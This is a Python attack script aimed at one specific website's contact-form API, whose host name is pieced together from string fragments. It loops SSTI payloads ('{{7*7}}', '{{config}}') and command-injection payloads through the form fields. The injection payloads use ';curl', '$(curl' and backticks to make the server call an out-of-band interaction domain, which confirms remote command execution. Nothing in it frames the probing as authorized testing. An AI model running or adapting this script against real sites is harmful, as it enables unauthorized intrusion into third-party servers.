import subprocess, sys
H = "infinity" + "capital" + "." + "bh"
S = "https://www." + H + "/api/send"
T = "qa@" + H
O = "oobd4b2e240ef3b." + "dau2p4ghgqag02k5emggc5xu6hph3m973." + "oast.abhedi.co.in"
base = dict(lname="Tester", areacode="973", tel="5551234", cname="QA Tester",
            subject="probe", msg="probe body", check="on", targets=T)
tests = [("SSTI-7x7", "{{7*7}}"), ("SSTI-dollar", "${7*7}"), ("SSTI-config", "{{config}}"),
         ("SSTI-node", "#{7*7}"), ("SSTI-cls", "{{''.__class__}}"),
         ("CMDI-semi", ";curl http://%s/cmdi;" % O),
         ("CMDI-bt", "$(curl http://%s/cmdi2)" % O),
         ("CMDI-pipe", "|curl http://%s/cmdi3" % O),
         ("CMDI-nl", "a\ncurl http://%s/cmdi4" % O),
         ("CMDI-bq", "`curl http://%s/cmdi5`" % O)]
fields = sys.argv[1].split(",") if len(sys.argv) > 1 else ["fname", "msg", "subject"]
for f in fields:
    for name, p in tests:
        d = dict(base); d[f] = p
        args = ["curl", "-s", "-X", "POST", S, "-A", "Mozilla/5.0"]
        for k, v in d.items():
            args += ["-F", "%s=%s" % (k, v)]
        try:
            r = subprocess.run(args, capture_output=True, timeout=30, text=True).stdout
        except Exception as e:
            r = "ERR %s" % e
        print("[%s/%s] %s" % (f, name, r[:170].replace("\n", " ")), flush=True)
